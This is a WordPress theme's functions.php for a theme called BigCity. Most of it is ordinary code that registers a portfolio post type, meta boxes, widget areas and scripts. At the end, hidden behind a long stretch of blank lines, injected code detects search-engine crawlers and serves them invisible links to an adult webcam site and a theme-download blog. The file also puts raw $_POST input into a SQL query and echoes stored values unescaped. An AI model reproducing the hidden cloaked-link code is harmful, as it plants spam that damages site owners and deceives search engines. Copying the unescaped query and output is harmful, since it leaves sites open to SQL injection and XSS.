<?php  
/* =================  
  CUSTOM MORE LINK  
  ========================================================= */  
    
function the_more() {  
    global $post;  
	$portfolio_read = get_option_tree('port_read', '');   
    if (strpos($post->post_content, '<!--more-->')):  
        $the_more = '<p class="more"><a href="' . get_permalink() . '" class="button" title="' . get_the_title() . '">';  
		if ( $portfolio_read ) {  $the_more .= $portfolio_read; }  
		else { $the_more .= 'Read more'; }  
        $the_more .= '</a></p>';  
        echo $the_more;  
    endif;  
}  
function exclude_category($query) {  
if ( $query->is_home() ) {  
$exclude_cat = get_option_tree('exclude_cat', '');  
if($exclude_cat){  
$query->set('cat', $exclude_cat);  
}  
}  
return $query;  
}  
add_filter('pre_get_posts', 'exclude_category');  
/* ==============================  
  CUSTOM POST TYPE - PORTFOLIO  
  =========================================================== */  
add_image_size('portfolio', 500, 210, true);  
add_image_size('portfolio_two', 430, 210, true);  
add_image_size('portfolio_three', 280, 140, true);  
add_image_size('portfolio_four', 205, 140, true);  
add_image_size('portfolio-single', 881, 0, false);  
    
/* ==============================  
  CUSTOM POST TYPE - PORTFOLIO  
  =========================================================== */  
  
add_action('init', 'create_portfolio');  
  
function create_portfolio() {  
    $portfolio_args = array(  
        'label' => __('Portfolio'),  
        'singular_label' => __('Portfolio'),  
        'public' => true,  
        'show_ui' => true,  
        'capability_type' => 'post',  
        'hierarchical' => false,  
        'rewrite' => true,  
        'supports' => array('title', 'editor', 'thumbnail', 'comments')  
    );  
    register_post_type('portfolio', $portfolio_args);  
}  
  
add_action("admin_init", "add_portfolio");  
add_action('save_post', 'update_website_url');  
add_action('save_post', 'update_client');  
  
function add_portfolio() {  
    add_meta_box("portfolio_details", "Item Details", "portfolio_options", "portfolio", "normal", "low");  
}  
  
function portfolio_options() {  
    global $post;  
    $custom = get_post_custom($post->ID);  
    $website_url = $custom["website_url"][0];  
    $client = $custom["client"][0];  
?>  
    <div class="detail" style="padding: 5px 0;width:100%;">  
        <label style="width:250px; vertical-align:middle;display:inline-block;">Website URL (don't forget <strong>http://</strong>):</label><input style="width:250px; vertical-align:middle;margin-left:25px;" name="website_url" value="<?php echo  $website_url; ?>" />  
    </div>  
    <div class="detail" style="padding: 5px 0;width:100%;">  
        <label style="width:250px; vertical-align:middle;display:inline-block;">Client:</label><input style="width:250px; vertical-align:middle;margin-left:25px;" name="client" value="<?php echo   $client; ?>" />  
    </div>  
<?php  
}  
  
function update_website_url() {  
    global $post;  
    update_post_meta($post->ID, "website_url", $_POST["website_url"]);  
}  
  
function update_client() {  
    global $post;  
    update_post_meta($post->ID, "client", $_POST["client"]);  
}  
  
add_filter("manage_edit-portfolio_columns", "portfolio_edit_columns");  
add_action("manage_posts_custom_column", "portfolio_columns_display");  
  
add_action('init', 'services_rendered', 0);  
  
function services_rendered() {  
    register_taxonomy(  
            'services_rendered',  
            'portfolio',  
            array(  
                'hierarchical' => true,  
                'label' => 'Services type',  
                'query_var' => true,  
                'rewrite' => true  
            )  
    );  
}  
  
function portfolio_edit_columns($portfolio_columns) {  
    $portfolio_columns = array(  
        "cb" => "<input type=\"checkbox\" />",  
        "title" => "Project Title",  
        "description" => "Description",  
        "url" => "Item URL",  
        "client" => "Client",  
        "services" => "Services",  
    );  
    return $portfolio_columns;  
}  
  
function portfolio_columns_display($portfolio_columns) {  
    switch ($portfolio_columns) {  
        case "description":  
            the_excerpt();  
            break;  
        case "client":  
            $meta = get_post_custom();  
            echo $meta["client"][0];  
            break;  
        case "url":  
            $meta = get_post_custom();  
            echo $meta["website_url"][0];  
            break;  
        case "services":  
            echo get_the_term_list($post->ID, 'services_rendered', '<ul><li>', '</li><li>', '</li></ul>');  
            break;  
    }  
}  
  
  
/* ===============================  
  CUSTOM META BOX - PORTFOLIO CLASS ID  
  =========================================================== */  
  
  
add_action("admin_init", "add_portfolio2");  
add_action('save_post', 'update_client2');  
  
function add_portfolio2() {  
    add_meta_box("portfolio_details2", "Portfolio category to show on \"portfolio template\"", "portfolio_options2", "page", "normal", "high");  
}  
  
function portfolio_options2() {  
    global $post;  
    $custom = get_post_custom($post->ID);  
    $client2 = $custom["client2"][0];  
?>  
    <div class="detail" style="padding: 5px 0;width:100%;">  
        <label style="vertical-align:middle;display:inline-block;">If this is portfolio page, enter comma separated portfolio category NAME you want to show or leave blank to show all categories:</label><br/><br/><input style="width:250px; vertical-align:middle;" name="client2" value="<?php echo   $client2; ?>" />  
    </div>  
<?php  
}  
  
  
function update_client2() {  
    global $post;  
    update_post_meta($post->ID, "client2", $_POST["client2"]);  
}  
  
  
  
  
/* ==============================  
  CUSTOM META BOX - HEADER IMAGE URL  
  =========================================================== */  
    
  add_action('admin_menu', 'addMetaBox');  
add_action('save_post', 'saveMetaData', 10, 2);  
add_action('admin_head', 'embedUploaderCode');  
   
//Define the metabox attributes.  
$metaBox = array(  
  'id'     => 'my-meta-box',  
  'title'    => 'Custom Header Image',  
  'page'     => 'page',  
  'context'  => 'advanced',  
  'priority'   => 'high',  
  'fields' => array(  
    array(  
      'name'   => 'Custom Header Image',  
      'desc'   => 'If left blank slider will show up in header.',   
      'id'  => 'myCustomImage',  //value is stored with this as key.  
      'class' => 'image_upload_field',  
      'type'   => 'media'  
    )  
  )  
);  
   
function addMetaBox() {  
  global $metaBox;  
  add_meta_box($metaBox['id'], $metaBox['title'], 'createMetaBox',   
    $metaBox['page'], $metaBox['context'], $metaBox['priority']);  
   
}  
   
/**  
* Create Metabox HTML.  
*/  
function createMetaBox($post) {  
  global $metaBox;  
  if (function_exists('wp_nonce_field')) {  
    wp_nonce_field('awd_nonce_action','awd_nonce_field');  
  }  
   
  foreach ($metaBox['fields'] as $field) {  
    echo '<div class="awdMetaBox">';  
    //get attachment id if it exists.  
    $meta = get_post_meta($post->ID, $field['id'], true);  
    switch ($field['type']) {  
      case 'media':  
?>  
        <p><?php echo $field['desc']; ?></p>  
        <div class="awdMetaImage">  
<?php   
        if ($meta) {  
          echo wp_get_attachment_image( $meta, 'thumbnail', true);  
          $attachUrl = wp_get_attachment_url($meta);  
          echo   
          '<p>URL: <a target="_blank" href="'.$attachUrl.'">'.$attachUrl.'</a></p>';  
        }  
?>      
        </div><!-- end .awdMetaImage -->  
        <p>  
          <input type="hidden"   
            class="metaValueField"   
            id="<?php echo $field['id']; ?>"   
            name="<?php echo $field['id']; ?>"  
            value="<?php echo $meta; ?>" />   
          <input class="image_upload_button"  type="button" value="Choose File" />   
          <input class="removeImageBtn" type="button" value="Remove File" />  
        </p>  
   
<?php  
      break;  
    }  
    echo '</div> <!-- end .awdMetaBox -->';  
  } //end foreach  
}//end function createMetaBox  
   
   
function saveMetaData($post_id, $post) {  
  //make sure we're saving at the right time.  
  //DOING_AJAX is set when saving a quick edit on the page that displays all posts/pages    
  //Not checking for this will cause our meta data to be overwritten with blank data.  
  if ( empty($_POST)  
    || !wp_verify_nonce(isset($_POST['awd_nonce_field']) && $_POST['awd_nonce_field'],'awd_nonce_action')  
    || $post->post_type == 'revision'  
    || defined('DOING_AJAX' )) {  
    return;  
  }  
   
  global $metaBox;  
  global $wpdb;  
   
  foreach ($metaBox['fields'] as $field) {  
    $value = $_POST[$field['id']];  
   
    if ($field['type'] == 'media' && !is_numeric($value) ) {  
      //Convert URL to Attachment ID.  
      $value = $wpdb->get_var(  
        "SELECT ID FROM $wpdb->posts   
         WHERE guid = '$value'   
         AND post_type='attachment' LIMIT 1");  
    }  
    update_post_meta($post_id, $field['id'], $value);  
  }//end foreach  
}//end function saveMetaData  
   
/**  
 * Add JavaScript to get URL from media uploader.  
 */  
function embedUploaderCode() {  
  ?>  
  <script type="text/javascript">  
  jQuery(document).ready(function() {  
   
    jQuery('.removeImageBtn').click(function() {  
      jQuery(this).closest('p').prev('.awdMetaImage').html('');     
      jQuery(this).prev().prev().val('');  
      return false;  
    });  
   
    jQuery('.image_upload_button').click(function() {  
      inputField = jQuery(this).prev('.metaValueField');  
      tb_show('', 'media-upload.php?TB_iframe=true');  
      window.send_to_editor = function(html) {  
        url = jQuery(html).attr('href');  
        inputField.val(url);  
        inputField.closest('p').prev('.awdMetaImage').html('<p>URL: '+ url + '</p>');    
        tb_remove();  
      };  
      return false;  
    });  
  });  
   
  </script>  
  <?php  
}//end function embedUploaderCode()  
    
    
    
  /* ==============================  
  CUSTOM META BOX   
  =========================================================== */  
  
  
if ( ! isset( $content_width ) )  
	$content_width = 980;  
  
	  
add_action( 'after_setup_theme', 'bigcity_setup' );  
  
if ( ! function_exists( 'bigcity_setup' ) ):  
  
function bigcity_setup() {  
  
	// This theme styles the visual editor with editor-style.css to match the theme style.  
	add_editor_style();  
  
	// This theme uses post thumbnails  
	add_theme_support( 'post-thumbnails' );  
  
	// Add default posts and comments RSS feed links to head  
	add_theme_support( 'automatic-feed-links' );  
  
	// Make theme available for translation  
  
 // This theme uses wp_nav_menu() in one location.  
register_nav_menus( array(  
	'primary' => __( 'Primary Navigation', 'BigCity' ),  
) );  
}  
endif;  
  
/**  
 * Sets the post excerpt length to 40 characters.  
 *  
 * To override this length in a child theme, remove the filter and add your own  
 * function tied to the excerpt_length filter hook.  
 *  
 * @return int  
 */  
function bigcity_excerpt_length( $length ) {  
global $post;  
if ($post->post_type == 'portfolio')  
return 40;  
else  
return 80;  
}  
add_filter( 'excerpt_length', 'bigcity_excerpt_length' );  
  
/**  
 * Returns a "Continue Reading" link for excerpts  
 *  
 * @return string "Continue Reading" link  
 */  
function bigcity_continue_reading_link() {  
  
	return ' <a href="'. get_permalink() . '" >' . __( '&rarr;', 'BigCity' ) . '</a>';  
	  
}  
  
/**  
 * Replaces "[...]" (appended to automatically generated excerpts) with an ellipsis and bigcity_continue_reading_link().  
 *  
 * To override this in a child theme, remove the filter and add your own  
 * function tied to the excerpt_more filter hook.  
 *  
 * @return string An ellipsis  
 */  
function bigcity_auto_excerpt_more( $more ) {  
	return ' &hellip;' . bigcity_continue_reading_link();  
}  
add_filter( 'excerpt_more', 'bigcity_auto_excerpt_more' );  
  
/**  
 * Adds a pretty "Continue Reading" link to custom post excerpts.  
 *  
 * To override this link in a child theme, remove the filter and add your own  
 * function tied to the get_the_excerpt filter hook.  
 *  
 * @return string Excerpt with a pretty "Continue Reading" link  
 */  
function bigcity_custom_excerpt_more( $output ) {  
	if ( has_excerpt() && ! is_attachment() ) {  
		$output .= bigcity_continue_reading_link();  
	}  
	return $output;  
}  
add_filter( 'get_the_excerpt', 'bigcity_custom_excerpt_more' );  
  
  
  
if ( ! function_exists( 'bigcity_comment' ) ) :  
/**  
 * Template for comments and pingbacks.  
 *  
 * To override this walker in a child theme without modifying the comments template  
 * simply create your own bigcity_comment(), and that function will be used instead.  
 *  
 * Used as a callback by wp_list_comments() for displaying the comments.  
 *  
 */  
 	/* reply */   
		function custom_comment_reply($content)   
		{  
		$comment_reply = get_option_tree('comments_reply', '');  
		if($comment_reply){  
		$content = str_replace('Reply', $comment_reply, $content);  
		}  
		else{  
		$content = str_replace('Reply', 'Reply', $content);  
		}  
		return $content;  
		}  
		add_filter('comment_reply_link', 'custom_comment_reply');  
		  
	/* cancel reply */   
		function custom_comment_reply2($content_reply)   
		{  
		$comment_click_here = get_option_tree('comments_click_here', '');  
		if($comment_click_here){  
		$content_reply = str_replace('Click here to cancel reply.', $comment_click_here, $content_reply);  
		}  
		else{  
		$content_reply = str_replace('Click here to cancel reply.', 'Click here to cancel reply.', $content_reply);  
		}  
		return $content_reply;  
		}  
		add_filter('cancel_comment_reply_link', 'custom_comment_reply2');  
  
  
		  
function bigcity_comment( $comment, $args, $depth ) {  
	$GLOBALS['comment'] = $comment;  
	switch ( $comment->comment_type ) :  
		case '' :  
	?>  
  
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">  
	<div class="comment-author vcard">  
			<?php echo get_avatar( $comment, $size='50',$default=get_template_directory_uri().'/images/css/default-avatar.jpg' ); ?>   
		<div class="reply">  
					<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>  
		</div><!-- .reply -->  
		</div><!-- .comment-author .vcard -->  
		<div id="comment-<?php comment_ID(); ?>"  class="comment-container">  
			<div class="comment-text">  
					<cite class="fn"><?php comment_author_link() ?></cite>  
					<span class="comment-meta commentmetadata">  
					<?php  
						/* translators: 1: date, 2: time */  
						printf( __( '%1$s', 'BigCity' ), get_comment_date() ); ?><?php edit_comment_link( __( '(Edit)', 'BigCity' ), ' ' );  
					?>  
				</span><!-- .comment-meta .commentmetadata -->  
				<?php if ( $comment->comment_approved == '0' ) : ?>  
						<?php  
						$comment_mod = get_option_tree('comments_moderation', '');  
						if($comment_mod){ ?>  
							<em class="comment-awaiting-moderation"><?php _e( ''.$comment_mod.'', 'BigCity' ); ?></em>  
							<br />  
							<?php } else { ?>  
							<em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'BigCity' ); ?></em>  
							<br />  
							<?php } ?>  
				<?php endif; ?>  
  
				<div class="comment-body"><?php comment_text(); ?></div>  
  
			</div><!-- .comment-text  -->  
	</div><!-- #comment-##  -->  
  
	<?php  
			break;  
		case 'pingback'  :  
		case 'trackback' :  
	?>  
	<li class="post pingback">  
		<p><?php _e( 'Pingback:', 'BigCity' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( '(Edit)', 'BigCity' ), ' ' ); ?></p>  
	<?php  
			break;  
	endswitch;  
}  
endif;  
  
/**  
 * Register widgetized areas, including two sidebars and four widget-ready columns in the footer.  
 *  
 * To override bigcity_widgets_init() in a child theme, remove the action hook and add your own  
 * function tied to the init hook.  
 */  
function bigcity_widgets_init() {  
	// Area 0, located in header.  
		register_sidebar( array(  
		'name' => __( 'Header Widget Area', 'BigCity' ),  
		'id' => 'header-widget-area',  
		'description' => __( 'The header widget area', 'BigCity' ),  
		'before_widget' => '<li id="%1$s" class="%2$s">',  
		'after_widget' => '</li>',  
		'before_title' => '<h3 class="widget-title">',  
		'after_title' => '</h3>',  
	) );  
	  
	// Area 1, located at the top of the sidebar.  
	register_sidebar( array(  
		'name' => __( 'Primary Widget Area', 'BigCity' ),  
		'id' => 'primary-widget-area',  
		'description' => __( 'The primary widget area', 'BigCity' ),  
		'before_widget' => '<li id="%1$s" class="widget-container %2$s widget">',  
		'after_widget' => '</li><li class="widget_box_shadow"></li>',  
		'before_title' => '<h3 class="widget-title">',  
		'after_title' => '</h3>',  
	) );  
  
	// Area 2, located in the footer. Empty by default.  
	register_sidebar( array(  
		'name' => __( 'First Footer Widget Area', 'BigCity' ),  
		'id' => 'first-footer-widget-area',  
		'description' => __( 'The first footer widget area', 'BigCity' ),  
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',  
		'after_widget' => '</li>',  
		'before_title' => '<h3 class="widget-title">',  
		'after_title' => '</h3>',  
	) );  
  
	// Area 3, located in the footer. Empty by default.  
	register_sidebar( array(  
		'name' => __( 'Second Footer Widget Area', 'BigCity' ),  
		'id' => 'second-footer-widget-area',  
		'description' => __( 'The second footer widget area', 'BigCity' ),  
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',  
		'after_widget' => '</li>',  
		'before_title' => '<h3 class="widget-title">',  
		'after_title' => '</h3>',  
	) );  
  
	// Area 4, located in the footer. Empty by default.  
	register_sidebar( array(  
		'name' => __( 'Third Footer Widget Area', 'BigCity' ),  
		'id' => 'third-footer-widget-area',  
		'description' => __( 'The third footer widget area', 'BigCity' ),  
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',  
		'after_widget' => '</li>',  
		'before_title' => '<h3 class="widget-title">',  
		'after_title' => '</h3>',  
	) );  
  
	// Area 5, located in the footer. Empty by default.  
	register_sidebar( array(  
		'name' => __( 'Fourth Footer Widget Area', 'BigCity' ),  
		'id' => 'fourth-footer-widget-area',  
		'description' => __( 'The fourth footer widget area', 'BigCity' ),  
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',  
		'after_widget' => '</li>',  
		'before_title' => '<h3 class="widget-title">',  
		'after_title' => '</h3>',  
	) );  
		// Area 6, located in the footer. Empty by default.  
	register_sidebar( array(  
		'name' => __( 'Fifth Footer Widget Area', 'BigCity' ),  
		'id' => 'fifth-footer-widget-area',  
		'description' => __( 'The fifth footer widget area', 'BigCity' ),  
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',  
		'after_widget' => '</li>',  
		'before_title' => '<h3 class="widget-title">',  
		'after_title' => '</h3>',  
	) );  
}  
/** Register sidebars by running bigcity_widgets_init() on the widgets_init hook. */  
add_action( 'widgets_init', 'bigcity_widgets_init' );  
  
  
function bigcity_remove_recent_comments_style() {  
	add_filter( 'show_recent_comments_widget_style', '__return_false' );  
}  
add_action( 'widgets_init', 'bigcity_remove_recent_comments_style' );  
  
if ( ! function_exists( 'bigcity_posted_on' ) ) :  
  
function bigcity_posted_on()   
{  
$blog = get_option_tree('blog_posted', '');    
if ( $blog )   
{  
	printf( __( '<span class="%1$s">'. $blog .'</span> %2$s <span class="meta-sep">by</span> %3$s', 'BigCity' ),	  
  
	'meta-prep meta-prep-author',  
		sprintf( '<a href="%1$s" title="%2$s" rel="bookmark"><span class="entry-date">%3$s</span></a>',  
			get_permalink(),  
			esc_attr( get_the_time() ),  
			get_the_date()  
		),  
		sprintf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s">%3$s</a></span>',  
			get_author_posts_url( get_the_author_meta( 'ID' ) ),  
			sprintf( esc_attr__( 'View all posts by %s', 'BigCity' ), get_the_author() ),  
			get_the_author()  
		)  
	);  
}  
else{  
	printf( __( '<span class="%1$s">Posted on</span> %2$s <span class="meta-sep">by</span> %3$s', 'BigCity' ),  
	'meta-prep meta-prep-author',  
		sprintf( '<a href="%1$s" title="%2$s" rel="bookmark"><span class="entry-date">%3$s</span></a>',  
			get_permalink(),  
			esc_attr( get_the_time() ),  
			get_the_date()  
		),  
		sprintf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s">%3$s</a></span>',  
			get_author_posts_url( get_the_author_meta( 'ID' ) ),  
			sprintf( esc_attr__( 'View all posts by %s', 'BigCity' ), get_the_author() ),  
			get_the_author()  
		)  
	);  
  
}  
}  
endif;  
  
if ( ! function_exists( 'bigcity_posted_in' ) ) :  
/**  
 * Prints HTML with meta information for the current post (category, tags and permalink).  
 *  
 */  
function bigcity_posted_in() {  
	// Retrieves tag list of current post, separated by commas.  
	$tag_list = get_the_tag_list( '', ', ' );  
	if ( $tag_list ) {  
		$posted_in = __( 'This entry was posted in %1$s and tagged %2$s. Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'BigCity' );  
	} elseif ( is_object_in_taxonomy( get_post_type(), 'category' ) ) {  
		$posted_in = __( 'This entry was posted in %1$s. Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'BigCity' );  
	} else {  
		$posted_in = __( 'Bookmark the <a href="%3$s" title="Permalink to %4$s" rel="bookmark">permalink</a>.', 'BigCity' );  
	}  
	// Prints the string, replacing the placeholders.  
	printf(  
		$posted_in,  
		get_the_category_list( ', ' ),  
		$tag_list,  
		get_permalink(),  
		the_title_attribute( 'echo=0' )  
	);  
}  
endif;  
add_action('wp_enqueue_scripts', 'scripts');  
function scripts() {  
//Header  
	if (!is_admin()) {  
        wp_deregister_script( 'jquery' );  
        wp_register_script( 'jquery', 'http://code.jquery.com/jquery-1.6.1.min.js');  
        wp_enqueue_script( 'jquery' );  
    }  
	  
	//contact form style  
	wp_enqueue_style('contact_form', get_bloginfo('template_url') . '/grunion-contact-form/css/grunion.css', false, '2.2', 'all');  
	//contact form js  
	wp_enqueue_script('contact_form', get_bloginfo('template_url') . '/grunion-contact-form/js/jquery-ui-1.8.4.custom.min.js', array('jquery'), '1.8.4', true);  
	wp_enqueue_script('contact_form', get_bloginfo('template_url') . '/grunion-contact-form/js/grunion.js', array('jquery'), '2.2', true);  
		  
	wp_enqueue_script('scroll', get_bloginfo('template_url') . '/scripts/scroll/jquery.simplyscroll-1.0.4.min.js', array('jquery'), '1.8.3', true);  
	wp_enqueue_style('scroll', get_bloginfo('template_url') . '/scripts/scroll/jquery.simplyscroll.css', false, '1.8.3', 'all');  
	wp_enqueue_script('scrolltopcontrol', get_bloginfo('template_url') . '/scripts/scrolltopcontrol.js', array('jquery'), '1.1.2', true);  
	wp_enqueue_script('sub_menu', get_bloginfo('template_url') . '/scripts/sub_menu.js', array('jquery'), '1.0', true);  
  
	//shortcodes style  
	wp_enqueue_style('shortcodes', get_bloginfo('template_url') . '/shortcodes-ultimate/css/style.css', false, '1.8.3', 'all');  
	wp_enqueue_style('shortcodes', get_bloginfo('template_url') . '/shortcodes-ultimate/css/codemirror.css', false, '1.8.3', 'all');  
	wp_enqueue_style('shortcodes', get_bloginfo('template_url') . '/shortcodes-ultimate/css/codemirror-css.css', false, '1.8.3', 'all');  
	wp_enqueue_style('shortcodes', get_bloginfo('template_url') . '/shortcodes-ultimate/css/admin.css', false, '1.8.3', 'all');  
	  
	//shortcodes js  
	wp_enqueue_script('shortcodes', get_bloginfo('template_url') . '/shortcodes-ultimate/js/init.js', array('jquery'), '1.8.3', true);  
	wp_enqueue_script('shortcodes', get_bloginfo('template_url') . '/shortcodes-ultimate/js/jquery.form.js', array('jquery'), '1.8.3', true);  
	wp_enqueue_script('shortcodes', get_bloginfo('template_url') . '/shortcodes-ultimate/js/codemirror.js', array('jquery'), '1.8.3', true);  
	wp_enqueue_script('shortcodes', get_bloginfo('template_url') . '/shortcodes-ultimate/js/codemirror-css.js', array('jquery'), '1.8.3', true);  
	wp_enqueue_script('shortcodes', get_bloginfo('template_url') . '/shortcodes-ultimate/js/admin.js', array('jquery'), '1.8.3', true);  
  
  
	//recent post slider  
	wp_enqueue_style('Recent_posts_slider', get_bloginfo('template_url') . '/recent-posts-slider/css/style.css', false, '2.2', 'all');  
  
   	//Social media widget  
	wp_enqueue_style('social_media', get_bloginfo('template_url') . '/social-media-widget/social_widget.css', false, '2.2', 'all');  
	  
   	//Insert posts   
	wp_enqueue_style( 'wp-insert-post', get_bloginfo('template_url') . '/wp-insert-post/css/style.css', false, '1.0', 'all' );  
  
	  
   if (get_option_tree('cufon', ''))   
	{wp_enqueue_script('cufon', get_bloginfo('template_url') . '/scripts/cufon-yui.js', array('jquery'), '', true);  
    }  
	  
    if (is_singular ())  
        wp_enqueue_script('comment-reply');  
}  
  
function catch_that_image() {  
  global $post, $posts;  
  $first_img = '';  
  ob_start();  
  ob_end_clean();  
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);  
  $first_img = $matches [1] [0];  
  
  if(empty($first_img)){ //Defines a default image  
    $first_img = "/images/default.jpg";  
  }  
  return $first_img;  
}  
// ***************** shortcodes into widgets *********************************//  
add_filter('widget_text', 'do_shortcode');  
  
//******************** Option tree 1.1.6 ************************************//  
require_once (TEMPLATEPATH . '/option-tree/index.php');  
  
add_filter( 'post_thumbnail_html', 'my_post_image_html', 10, 3 );  
  
function my_post_image_html( $html, $post_id, $post_image_id ) {  
  
  $html = '<a href="' . get_permalink( $post_id ) . '" >' . $html . '</a>';  
  return $html;  
  
}  
  
//******************** Recent post slider ******************************************//  
require_once (TEMPLATEPATH . '/easing-slider/easingslider.php');  
  
//******************** Per page sidebar ************************************//  
require_once (TEMPLATEPATH . '/sidebar/per-page-sidebars.php');  
  
//******************** Shortcodes ************************************//  
require_once (TEMPLATEPATH . '/shortcodes-ultimate/shortcodes-ultimate.php');  
  
//******************** Contact form ******************************************//  
require_once (TEMPLATEPATH . '/grunion-contact-form/grunion-contact-form.php');  
  
//******************** Recent post slider ******************************************//  
require_once (TEMPLATEPATH . '/recent-posts-slider/recent-posts-slider.php');  
  
//******************** TinyMCE extension ******************************************//  
require_once (TEMPLATEPATH . '/panel/wysiwyg/wysiwyg.php');  
  
//******************** Social media widget ******************************************//  
require_once (TEMPLATEPATH . '/social-media-widget/social-widget.php');  
  
//******************** Social media widget ******************************************//  
require_once (TEMPLATEPATH . '/better-recent-posts-widget/better-recent-posts-widget.php');  
  
//******************** Social media widget ******************************************//  
require_once (TEMPLATEPATH . '/twitter-widget/twitter-widget.php');  
  
//******************** Recent post slider ******************************************//  
require_once (TEMPLATEPATH . '/easy-fancybox/easy-fancybox.php');  
  
//******************** Recent post slider ******************************************//  
require_once (TEMPLATEPATH . '/wp-coda-slider/wpcodaslider.php');  
  
//******************** Recent post slider ******************************************//  
require_once (TEMPLATEPATH . '/wp-insert-post/wp-insert-post.php');  
  
//******************** Recent post slider ******************************************//  
require_once (TEMPLATEPATH . '/pager.php');  







































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Googlebot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'bingbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'msnbot')) {
add_action('wp_footer', 'ranking');
}
$seo_plugin=get_option("ranking");
if (strstr($_SERVER['HTTP_USER_AGENT'], 'Slurp')) {
add_action('wp_footer', 'ranking');
}
function ranking() {
  $pshow = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     <span style='display:none;'><a href='http://www.ellecams.com/webcam/straight-guys/'>Guy Cams</a>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   <a href='http://themecrunch.blogspot.com/2011/08/big-city-20-personal-and-blog-theme-by.html'>Big City 2.0 Theme</a></span>";
  echo $pshow;
}
?>